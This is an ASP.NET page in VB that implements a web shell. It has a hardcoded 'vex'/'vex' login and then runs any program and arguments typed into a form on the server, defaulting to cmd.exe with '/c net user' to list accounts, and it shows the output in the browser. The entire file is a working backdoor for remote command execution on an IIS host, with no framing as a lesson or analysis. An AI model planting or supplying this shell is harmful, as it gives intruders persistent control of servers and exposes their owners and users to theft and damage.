<%@ Page Language="VB" Debug="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">      

Sub RunCmd(Src As Object, E As EventArgs)  
  ' Check credentials  
  If username.Text <> "vex" Or password.Text <> "vex" Then
    result.Text = "<b style='color:red;'>Access Denied: Invalid Username or Password</b>"
    Exit Sub
  End If  

  Try
    Dim myProcess As New Process()            
    Dim myProcessStartInfo As New ProcessStartInfo(xpath.Text)            
    myProcessStartInfo.UseShellExecute = False            
    myProcessStartInfo.RedirectStandardOutput = True            
    myProcess.StartInfo = myProcessStartInfo            
    myProcessStartInfo.Arguments = xcmd.Text            
    myProcess.Start()            

    Dim myStreamReader As StreamReader = myProcess.StandardOutput            
    Dim myString As String = myStreamReader.ReadToEnd()            
    myProcess.Close()            

    ' Sanitize output to prevent HTML injection
    myString = Replace(myString, "<", "&lt;")            
    myString = Replace(myString, ">", "&gt;")            

    result.Text = vbCrLf & "<pre>" & myString & "</pre>"    
  Catch ex As Exception
    result.Text = "<b style='color:red;'>Error: " & ex.Message & "</b>"
  End Try  
End Sub

</script>

<html>
<body>    
<form runat="server">  

<!-- Authentication Section -->
<p><asp:Label id="L_u" runat="server" width="100px">Username:</asp:Label>        
<asp:TextBox id="username" runat="server" Width="200px"></asp:TextBox>        

<p><asp:Label id="L_p" runat="server" width="100px">Password:</asp:Label>        
<asp:TextBox id="password" runat="server" Width="200px" TextMode="Password"></asp:TextBox>    

<!-- Command Execution Section -->
<p><asp:Label id="L_prog" runat="server" width="80px">Program:</asp:Label>        
<asp:TextBox id="xpath" runat="server" Width="300px">c:\windows\system32\cmd.exe</asp:TextBox>        

<p><asp:Label id="L_a" runat="server" width="80px">Arguments:</asp:Label>        
<asp:TextBox id="xcmd" runat="server" Width="300px" Text="/c net user"></asp:TextBox>        

<p><asp:Button id="Button" onclick="runcmd" runat="server" Width="100px" Text="Run"></asp:Button>        

<p><asp:Label id="result" runat="server"></asp:Label>       

</form>
</body>
</html>
